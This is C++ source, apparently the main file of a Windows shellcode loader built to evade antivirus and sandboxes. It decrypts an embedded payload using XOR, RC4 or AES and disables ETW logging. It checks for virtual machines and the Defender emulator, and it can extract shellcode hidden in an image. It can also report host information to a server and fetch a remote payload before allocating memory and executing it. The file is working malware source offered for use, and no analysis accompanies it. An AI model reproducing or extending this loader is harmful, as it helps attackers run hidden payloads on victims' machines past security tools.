#include <iostream>
#include <Windows.h>
#include "Tools.h"
#include "Struct.h"
#include "ShellcodeExec.h"
#include "PIGSyscall.hpp"
#include "definition.h"
#include "AntiVm.h"
#include "Function.hpp"
#include "shellcode.h"
#include "requests/infoSender.h"
#include "scheduleTask/atsvc.h"
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

static auto& dynamicInvoker = DynamicInvoker::get_instance();

void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
	switch (encryptMethod) {
	case CASE_XOR: {
		DWORD key_int = *(DWORD*)key;
		for (SIZE_T i = 0; i < size; i++) {
			((BYTE*)lpMem)[i] ^= ((key_int >> ((i % 4) * 8)) & 0xFF);
		}
		break;
	}
	case CASE_RC4: {
		// RC4 初始化
		BYTE S[256];
		BYTE temp;
		int i, j = 0;

		// 初始化 S-box
		for (i = 0; i < 256; i++)
			S[i] = i;

		for (i = 0; i < 256; i++) {
			j = (j + S[i] + key[i % key_size]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;
		}

		// RC4 加密/解密
		i = j = 0;
		for (SIZE_T pos = 0; pos < size; pos++) {
			i = (i + 1) % 256;
			j = (j + S[i]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;

			BYTE keystream = S[(S[i] + S[j]) % 256];
			((BYTE*)lpMem)[pos] ^= keystream;
		}
		break;
	}
	case CASE_AES: {
		BCRYPT_ALG_HANDLE hAlg = NULL;
		BCRYPT_KEY_HANDLE hKey = NULL;
		NTSTATUS status;

		// key 的前16字节是 IV，后32字节是实际密钥
		BYTE* iv = key;
		BYTE* aes_key = key + 16;

		// 初始化 AES
		status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (!NT_SUCCESS(status)) return;

		// 创建密钥
		status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, aes_key, 32, 0);
		if (!NT_SUCCESS(status)) {
			BCryptCloseAlgorithmProvider(hAlg, 0);
			return;
		}

		// 解密
		ULONG cbResult;
		status = BCryptDecrypt(
			hKey,
			(PUCHAR)lpMem,
			size,
			NULL,
			iv,        // 使用保存的IV
			16,        // IV size
			(PUCHAR)lpMem,
			size,
			&cbResult,
			BCRYPT_BLOCK_PADDING  // 启用填充
		);

		// 清理
		if (hKey) BCryptDestroyKey(hKey);
		if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
		break;
	}
	default:
		break;
	}
}


void test() {

}


// Hide Console
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
// int main() {
// 
	// init
	initAllFunc();

// ============================= TEST ===============================	
	// test();
	// return 0;
// ============================= TEST END ===============================	

	if (DisableETW) {
		disableETW();
	}
	if (EnableMultiplePayloadControl) {
		if (isPayloadRunning()) {
			return 0;
		}
	}



	if (AntiDefenderVM) {
		wdCheckEmulatedVFS();
		if (STATUS_NOT_SUPPORTED != wdIsEmulatorPresent()){ // is emulator
			memcpy(0, 0, 1); // exit
		}
		if (wdIsEmulatorPresent2()) {
			memcpy(0, 0, 1);
		}		
		if (wdIsEmulatorPresent3()) {
			memcpy(0, 0, 1);
		}
	}
	if (checkVXQQ) {
		if (!checkProcessVX_QQ()) memcpy(0, 0, 1);
	}
	if (EnableAntiVM) {
		if (trick_DllGetClassObject) {
			if (checkDllGetClassObject()) {
				memcpy(0, 0, 1);
			}
		}
		if (trick_SxInDll) {
			if (checkSxInDll()) {
				memcpy(0, 0, 1);
			}
		}
		BOOLEAN isVirtualMachine = FALSE;

		isVirtualMachine = checkCPUCoreNum() | checkPhysicalMemory() | checkBootTime() | checkGPUMemory() |
			checkMacAddrPrefix() | accelerated_sleep();
		DebugPrintA(ENCRYPT_STR("isVirtualMachine[+]: %d\n"), isVirtualMachine);
		if (isVirtualMachine) {
			memcpy(0, 0, 1);
		}
		
	}
	
	// ============================= Allocate Memory ===============================

	LPVOID lpMem = nullptr;
	SIZE_T size = 0;
	const void* shellcode_ptr = nullptr;

	std::vector<unsigned char> shellcode_vec;
		
	if (EnableSteg && !EnableAccessControl) {
		PBYTE stegShellcode = NULL;
		DWORD stegSize = 0;

		// 获取当前目录
		WCHAR currentDir[MAX_PATH];
		GetCurrentDirectoryW(MAX_PATH, currentDir);

		// 构建图片路径
		WCHAR imagePath[MAX_PATH];
		wcscpy_s(imagePath, currentDir);
		wcscat_s(imagePath, stegPath);

		if (!ExtractShellcodeFromImage(imagePath, &stegShellcode, &stegSize)) {
			// DebugPrintA("Failed to extract shellcode from image\n");
			return -1;
		}

		// 使用提取的shellcode替换原始数据
		memcpy(shellcode, stegShellcode, stegSize);
		shellcode_size = stegSize;

		NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtFreeVirtualMemoryStruct.funcAddr, NtFreeVirtualMemoryStruct.funcHash,
			(HANDLE)-1, &stegShellcode,&size,MEM_RELEASE);
			
		shellcode_ptr = shellcode;
		size = shellcode_size;
	}

#ifdef ENABLE_ADMISSION_PLATFORM
	else if (EnableAccessControl) {
		send_info();
	
		custom_sleep(1000 * 30); // 等待半分钟后开始轮询
		shellcode_vec = fetch_payload();
	
		size = shellcode_vec.size();
		if (size == 0) return 0;
	
		shellcode_ptr = shellcode_vec.data();
	}
#endif

	else {
		size = shellcode_size;
		shellcode_ptr = shellcode;
	}
	// =========================== Add to scheduleTask =============================
	// if has admin permission, add to scheduleTask
	if (IsRunningAsAdmin()) {
		// addScheduleTask(); // TODO 暂时注释掉
	}
	// ============================= Allocate Memory ===============================
	NTSTATUS status = AllocateMem(&lpMem, &size);
	memcpy(lpMem, shellcode_ptr, size);
	DecryptShellcode(lpMem, size); 

	ExecuteShellcodeStruct execStruct = { lpMem,size };
	ExecuteShellcode(&execStruct);
	
	

	return 0;
}